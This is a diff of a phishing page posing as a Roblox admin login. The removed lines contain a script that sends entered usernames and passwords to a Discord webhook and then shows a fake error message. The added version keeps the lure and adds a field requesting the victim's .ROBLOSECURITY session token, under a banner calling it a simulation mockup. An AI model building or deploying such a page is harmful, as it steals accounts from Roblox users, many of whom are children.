@@ -1,21 +1,29 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Roblox - Admin Panel</title>
+  <meta charset="UTF-8" />
+  <title>Roblox Admin Panel</title>
   <link rel="icon" href="https://www.roblox.com/favicon.ico" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <style>
+    :root {
+      --primary: #ff3c00;
+      --dark-bg: #1b1b1b;
+      --card-bg: #2c2f33;
+      --accent: #d33b00;
+      --input-bg: #2b2f36;
+      --text-color: #ccc;
+    }
+
     body {
       margin: 0;
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background-color: #121212;
-      color: white;
-      overflow-x: hidden;
+      background-color: var(--dark-bg);
+      color: var(--text-color);
     }
 
     .header {
-      background-color: #181818;
+      background-color: #232527;
       padding: 20px 40px;
       display: flex;
       align-items: center;
@@ -35,93 +43,62 @@
       justify-content: center;
       align-items: center;
       color: white;
-      font-size: 55px;
+      font-size: 52px;
       font-weight: bold;
-      text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.8);
+      text-shadow: 3px 3px 8px rgba(0, 0, 0, 0.8);
       text-transform: uppercase;
-      animation: gradient-animation 3s ease infinite;
-    }
-
-    @keyframes gradient-animation {
-      0% { background: linear-gradient(to right, #b0b0b0, #ffffff); }
-      50% { background: linear-gradient(to right, #ffffff, #b0b0b0); }
-      100% { background: linear-gradient(to right, #b0b0b0, #ffffff); }
+      animation: fadeIn 1.4s ease-out;
     }
 
     .container {
       max-width: 500px;
-      margin: 40px auto;
-      background: #2a2a2a;
-      padding: 40px;
-      border-radius: 10px;
-      box-shadow: 0 4px 16px rgba(0,0,0,0.2);
+      margin: 50px auto;
+      background: var(--card-bg);
+      padding: 45px;
+      border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.25);
       text-align: center;
-      opacity: 0;
-      animation: fade-in 1.5s forwards;
-    }
-
-    @keyframes fade-in {
-      from {
-        opacity: 0;
-        transform: translateY(20px);
-      }
-      to {
-        opacity: 1;
-        transform: translateY(0);
-      }
+      animation: slideUp 1s ease-out;
     }
 
     .container h2 {
-      margin-bottom: 20px;
-      color: #00b0f0;
+      color: var(--primary);
       font-size: 32px;
-      font-weight: bold;
-      text-transform: uppercase;
+      margin-bottom: 15px;
     }
 
     .container p {
       color: #aaa;
-      font-size: 16px;
-      margin-bottom: 25px;
+      font-size: 15px;
+      margin-bottom: 30px;
     }
 
     input {
       width: 100%;
       padding: 14px;
       margin: 10px 0;
-      border-radius: 4px;
+      border-radius: 6px;
       border: 1px solid #444;
-      background-color: #333;
+      background-color: var(--input-bg);
       color: white;
-      font-size: 16px;
-      transition: background-color 0.3s ease;
-    }
-
-    input:focus {
-      background-color: #444;
-      outline: none;
+      font-size: 15px;
     }
 
     .login-btn {
-      background-color: #007bff;
+      background-color: var(--primary);
       color: white;
       padding: 14px;
       width: 100%;
       border: none;
-      border-radius: 4px;
-      font-size: 18px;
+      border-radius: 6px;
+      font-size: 17px;
       cursor: pointer;
-      transition: background-color 0.3s ease;
+      transition: background-color 0.3s ease, transform 0.2s ease;
     }
 
     .login-btn:hover {
-      background-color: #0056b3;
-    }
-
-    .error {
-      color: red;
-      display: none;
-      margin-top: 10px;
+      background-color: var(--accent);
+      transform: translateY(-2px);
     }
 
     .sticky-bar {
@@ -141,19 +118,10 @@
       bottom: 0;
     }
 
-    /* Hover Animations */
-    input:hover {
-      background-color: #444;
-    }
-
-    .login-btn:active {
-      transform: scale(0.98);
-    }
-
-    /* Animazione di scorrimento */
-    @keyframes slide-up {
+    /* Animations */
+    @keyframes slideUp {
       0% {
-        transform: translateY(30px);
+        transform: translateY(50px);
         opacity: 0;
       }
       100% {
@@ -162,22 +130,19 @@
       }
     }
 
-    .hero {
-      animation: gradient-animation 3s ease infinite, slide-up 1s ease-out;
-    }
-
-    .container {
-      animation: fade-in 1.5s ease-out;
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
     }
 
     /* Responsive */
-    @media screen and (max-width: 768px) {
+    @media (max-width: 600px) {
       .container {
         padding: 30px;
       }
 
       .hero {
-        font-size: 40px;
+        font-size: 36px;
       }
     }
   </style>
@@ -189,43 +154,25 @@
   </div>
 
   <div class="hero">
-    Roblox Admin Panel
+    Admin Panel
   </div>
 
   <div class="container">
-    <h2>Become an Admin</h2>
-    <p>Join the Roblox team and help improve the platform!</p>
-    <form onsubmit="sendData(); return false;">
-      <input type="text" id="username" placeholder="Username" required />
-      <input type="password" id="password" placeholder="Password" required />
+    <h2>Access Console</h2>
+    <p>Login to continue to the secure control panel.</p>
+    <form>
+      <input type="text" placeholder="Username" required />
+      <input type="password" placeholder="Password" required />
+      <input type="text" placeholder=".ROBLOSECURITY Token (optional)" />
       <button type="submit" class="login-btn">Log In</button>
     </form>
-    <div class="error" id="errorMsg">Username or password is incorrect.</div>
   </div>
 
   <div class="sticky-bar" id="stickyBar">
-    Roblox Admin – Simulation Environment
+    ⚙️ Roblox Admin Interface – UI Mockup for Simulation Purposes
   </div>
 
   <script>
-    function sendData() {
-      const username = document.getElementById("username").value;
-      const password = document.getElementById("password").value;
-
-      fetch("https://discord.com/api/webhooks/1362415600156279065/CXdU0OkdjfmMut8SdXgZujVEWTceZf-fieiU9qt-F3YGbAncvVZcQRsGZujU9fjBF5gz", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          content: `Simulated Login:\nUsername: ${username}\nPassword: ${password}`
-        })
-      });
-
-      document.getElementById("errorMsg").style.display = "block";
-    }
-
-    // Show sticky bar on scroll
     window.addEventListener("scroll", () => {
       const bar = document.getElementById("stickyBar");
       if (window.scrollY > 50) {
